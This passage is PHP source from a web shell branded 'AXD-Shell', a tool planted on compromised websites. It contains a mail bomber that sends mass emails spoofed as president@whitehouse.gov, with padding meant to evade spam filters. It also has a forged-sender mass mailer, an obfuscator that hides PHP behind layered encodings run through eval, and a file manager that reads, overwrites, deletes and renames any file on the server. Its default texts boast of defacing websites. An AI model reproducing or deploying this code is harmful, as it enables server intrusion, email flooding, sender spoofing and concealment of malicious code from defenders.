                </tr>
            </table>            
        </form>
        <?php
    }
}

// Mail Bomber

else if(isset($_GET['bomb']))
{
    if(
        isset($_GET['to']) &&
        isset($_GET['subject']) &&
        isset($_GET['message']) &&
        isset($_GET['times']) &&
        $_GET['to'] != '' &&
        $_GET['subject'] != '' &&
        $_GET['message'] != '' &&
        $_GET['times'] != ''
    )
    {
        $times = $_GET['times'];
        while($times--)
        {
            if(isset($_GET['padding']))
            {
                $fromPadd = rand(0,9999);
                $subjectPadd = " -- ID : ".rand(0,9999999);
                $messagePadd = "\n\n------------------------------\n".rand(0,99999999);
                
            }
            $from = "president$fromPadd@whitehouse.gov";
            if(!mail($_GET['to'],$_GET['subject'].$subjectPadd,$_GET['message'].$messagePadd,"From:".$from))
            {
                $error = 1;
                echo "<p class='alert_red'>Some Error Occured!</p>";
                break;
            }
        }
        if($error != 1)
        {
            echo "<p class='alert_green'>Mail(s) Sent!</p>";
        }
    }
    else
    {
        ?>
        <form method="GET">
            <input type="hidden" name="bomb" />
            <table id="margins">
                <tr>
                    <td class="title">
                        To 
                    </td>
                    <td>
                        <input class="cmd" name="to" value="victim@domain.com,victim2@domain.com" onfocus="if(this.value == 'victim@domain.com,victim2@domain.com')this.value = '';" onblur="if(this.value=='')this.value='victim@domain.com,victim2@domain.com';"/>
                    </td>
                </tr>
                
                <tr>
                    <td class="title">
                        Subject
                    </td>
                    <td>
                        <input type="text" class="cmd" name="subject" value="AXD has invade a website!" onfocus="if(this.value == 'AXD has invade a website!')this.value = '';" onblur="if(this.value=='')this.value='AXD has invade a website!';" />
                    </td>
                </tr>
                 <tr>
                    <td class="title">
                        No. of Times  
                    </td>
                    <td>
                        <input class="cmd" name="times" value="100" onfocus="if(this.value == '100')this.value = '';" onblur="if(this.value=='')this.value='100';"/>
                    </td>
                </tr>
       
                <tr>
                    <td>
                        
                        Pad your message (Less spam detection)
                        
                    </td>
                    <td>
                    
                        <input type="checkbox" name="padding"/>
                          
                    </td>
                </tr>
                <tr>
                    <td colspan="2">
                        <textarea name="message" cols="110" rows="10" class="cmd">AXD-Shell Rocks!!</textarea>
                    </td>
                </tr>
                
                
                <tr>
                    <td rowspan="2">
                        <input style="margin : 20px; margin-left: 390px; padding : 10px; width: 100px;" type="submit" class="own" value="Send! :D"/>
                    </td>
                </tr>
            </table>            
        </form>   
        <?php
    }
}

//Mass Mailer

else if(isset($_GET['mail']))
{
    if(
        isset($_GET['to']) &&
        isset($_GET['from']) &&
        isset($_GET['subject']) &&
        isset($_GET['message'])
    )
    {

        if(mail($_GET['to'],$_GET['subject'],$_GET['message'],"From:".$_GET['from']))
        {
            echo "<p class='alert_green'>Mail Sent!</p>";
        }
        else
        {
            echo "<p class='alert_red'>Some Error Occured!</p>";
        }
    }
    else
    {
        ?>
        <form method="GET">
            <input type="hidden" name="mail" />
            <table id="margins">
                <tr>
                    <td width="100" class="title">
                        From
                    </td>
                    <td>
                        <input class="cmd" name="from" value="president@whitehouse.gov" onfocus="if(this.value == 'president@whitehouse.gov')this.value = '';" onblur="if(this.value=='')this.value='president@whitehouse.gov';"/>
                    </td>
                </tr>
                
                <tr>
                    <td class="title">
                        To 
                    </td>
                    <td>
                        <input class="cmd" name="to" value="victim@domain.com,victim2@domain.com" onfocus="if(this.value == 'victim@domain.com,victim2@domain.com')this.value = '';" onblur="if(this.value=='')this.value='victim@domain.com,victim2@domain.com';"/>
                    </td>
                </tr>
                
                <tr>
                    <td class="title">
                        Subject
                    </td>
                    <td>
                        <input type="text" class="cmd" name="subject" value="AXD has invade a website!" onfocus="if(this.value == 'AXD has invade a website!')this.value = '';" onblur="if(this.value=='')this.value='AXD has invade a website!';" />
                    </td>
                </tr>
                
                
                <tr>
                    <td colspan="2">
                        <textarea name="message" cols="110" rows="10" class="cmd">All i remember are those lonely nights when i was defacing those insecure websites!</textarea>
                    </td>
                </tr>
                
                
                <tr>
                    <td rowspan="2">
                        <input style="margin : 20px; margin-left: 390px; padding : 10px; width: 100px;" type="submit" class="own" value="Send! :D"/>
                    </td>
                </tr>
            </table>            
        </form>   
        <?php
    }
}


// Edit File

else if(isset($_POST['file']) &&
        isset($_POST['content']) )
{
    if(is_dir($_POST['file']))
    {
        header("location:".$self."?dir=".$_POST['file']);
    }
    if(file_exists($_POST['file']))
    {
        $handle = fopen($_POST['file'],"w");
	if (!handle) echo "<p class='alert_red'>Permission Denied</p>";
	else {
        	fwrite($handle,$_POST['content']);
        	echo "Your changes were Successfully Saved!";
        }
    }
    else
    {
        echo "<p class='alert_red'>File Name Specified does not exists!</p>";
    }
}

// PHP Obfuscator

else if(isset($_GET['obfuscate']))
{
    if ( isset($_POST['code']) &&
               $_POST['code'] != '')
    {
        $encoded = base64_encode(gzdeflate(convert_uuencode(str_rot13(gzdeflate(base64_encode($_POST['code']))))));
        $encode = '
<?php
$encoded = \''.$encoded.'\';
eval(base64_decode(gzinflate(str_rot13(convert_uudecode(gzinflate(base64_decode(($encoded))))))));
// Script Encoded by AXD-Shell 
?>
';
    }
    else
    {
        $encode = 'Please Enter your Code! and Click Submit! :) | # <?php and ?> did\'nt needed.';    
    }?>
    <form method="POST">
        <textarea class="cmd" cols="100" rows="20" name="code"><?php echo $encode;?></textarea><br />
        <input style="margin: 20px; margin-left: 50px; padding: 10px;"  class="own"  type="submit" value="Encode :D"/>
    </form>
    
    <?php
}

//open file

else if(isset($_GET['open']))
{
    ?>
	</center>
        <form method="POST" action="<?php echo $self;?>" >
        <table>
            <tr>
                <td>File </td><td> : </td><td><input value="<?php echo $_GET['open'];?>" class="cmd" name="file" /></td>
            </tr>
            <tr>
                <td>Size </td><td> : </td><td><input value="<?php echo filesize($_GET['open']);?>" class="cmd" /></td> 
            </tr>
        </table>
        <textarea name="content" rows="20" cols="60" class="cmd"><?php
        $content = htmlspecialchars(file_get_contents($_GET['open']));
        if($content)
        {
            echo $content;
        }
        else if(function_exists('fgets') && function_exists('fopen') && function_exists('feof'))
        {
            $fd = fopen($_GET['open']);
	    if (!$fd) echo "<p class='alert_red'>Permission Denied</p>";
	    else {
            while(!feof())
            {
                echo htmlspecialchars(fgets($fd));
            }
            }
        }

        ?>
        </textarea><br />
        <input name="save" type="Submit" value="Save Changes" class="own" id="spacing"/>
        </form>
    <?php
}

//Rename

else if(isset($_GET['rename']))
{
    if(isset($_GET['to']) && isset($_GET['rename']))
    {
        if(rename($_GET['rename'],$_GET['to']) == FALSE)
        {
            ?>
            <big><p class="blink">Cant rename the file specified! Please check the file-name , Permissions and try again!</p></big>
            <?php
        }
        else
        {
            ?>
            <big><p class="blink">File Renamed , Return <a href="<?php echo $self;?>">Here</a></p></big>
            <?php
        }
    }
    else
    {
?>
    <form method="GET" action="<?php echo $self;?>" >
        <table>
            <tr>
                <td>File </td><td> : </td><td><input value="<?php echo $_GET['rename'];?>" class="cmd" name="rename" /></td>
            </tr>
            <tr>
                <td>To </td><td> : </td><td><input value="<?php echo $_GET['rename'];?>" class="cmd" name="to" /></td> 
            </tr>
        </table>
        <input type="Submit" value="Rename :D" class="own" style="margin-left: 160px;padding: 5px;"/>
        </form>   
    <?php
    }
}
// No request made
// Display home page

else
{
    echo "    </center>";
    $dir = getcwd();
    if(isset($_GET['dir']))
    {
        $dir = $_GET['dir'];
    }
    ?>
    <table id="margins">
    <tr>
        <form method="GET" action="<?php echo $self;?>">
        <td width="100">PWD</td><td width="410"><input name="dir" class="cmd" id="mainInput" value="<?php echo $dir;?>"/></td>
        <td><input type="submit" value="GO" class="own" /></td>
        </form>
    </tr>
    </table>
    
    <table id="margins" class="files">
    <tr>
        <th class="header" width="500px">Name</th>
        <th width="100px" class="header">Size</th>
        <th width="100px" class="header">Permissions</th>
        <th width="100px" class="header">Delete</th>
        <th width="100px" class="header">Rename</th>
	<th width="100px" class="header">Zip</th>
    </tr>
    <?php
    
    if(isset($_GET['delete']))
    {
        if(unlink(($_GET['delete'])) == FALSE)
        {
            echo "<p id='margins' class='alert_red'>Could Not Delete the FILE Specified</p>";
        }
    }

    else if(isset($_GET['delete_dir']))
    {
        if(rmdir(($_GET['delete'])) == FALSE)
        {
            echo "<p id='margins' class='alert_red'>Could Not Delete the DIRECTORY Specified</p>";
        }
    }

    if(is_dir($dir))
    {
        $handle = opendir($dir);
        if($handle != FALSE)
        {
        if($dir[(strlen($dir)-1)] != $SEPARATOR){$dir = $dir.$SEPARATOR;}
        while (($file = readdir($handle)) != false) {
                if ($file != "." && $file != "..")
        	{
		
		$color = 'red';
		if(is_readable($dir.$file))
		{
			$color = 'yellow';
		}
		if(is_writable($dir.$file))
		{
			$color = 'green';
		}
		
                if(is_dir($dir.$file))
                {
                    ?>
                    <tr>
                    <td class='dir'><a style="color: <?php echo $color?>;" href='<?php echo $self ?>?dir=<?php echo $dir.$file ?>'><b>/<?php echo $file ?></b></a></td>
                    <td class='info'><?php echo HumanReadableFilesize(dirSize($dir.$file));?></td>
                    <td class='info'><?php echo getFilePermissions($dir.$file);?></td>
                    <td class="info"><a href="<?php echo $self;?>?delete_dir=<?php echo $dir.$file;?>">Delete</a></td>
                    <td class="info"><a href="<?php echo $self;?>?rename=<?php echo $dir.$file;?>">Rename</a></td>
		    <td class="info"><a href="<?php echo $self;?>?zip=<?php echo $dir.$file;?>">Download (zip)</a></td>
                    </tr>
                <?php
                }
                //Its a file 
                else
                {
                    ?>
                    <tr>
                    <td class='file'><a style="color: <?php echo $color?>;" href='<?php echo $self ?>?open=<?php echo $dir.$file ?>'><?php echo $file ?></a></td>
                    <td class='info'><?php echo HumanReadableFilesize(filesize($dir.$file));?></td>
                    <td class='info'><?php echo getFilePermissions($dir.$file);?></td>
                    <td class="info"><a href="<?php echo $self;?>?delete=<?php echo $dir.$file;?>">Delete</a></td>
                    <td class="info"><a href="<?php echo $self;?>?rename=<?php echo $dir.$file;?>">Rename</a></td>
	            <td class="info"><a href="<?php echo $self;?>?zip=<?php echo $dir.$file;?>">Download (zip)</a></td>
                    </tr>
                    <?php
                }
            }
        }
        closedir($handle);
        }
    }
    else
    {
        echo "<p class='alert_red' id='margins'>Permission Denied</p>";
    }
    ?>
    </table>
    <?php
  
}
//------------------------------------------------------------------------------------------------
?>

<?php
}
// End Shell
//-------------------------------------------------------------------------------------------------
?>
  <div class="clearfooter"></div>
</div>

<div class="end" id='footer' style="margin-top: 20px;">
<p align="center"><b>&copy AXD, 2017</b></p><br><hr noshade style="border:1px solid white">
</div>

</body>
</html>
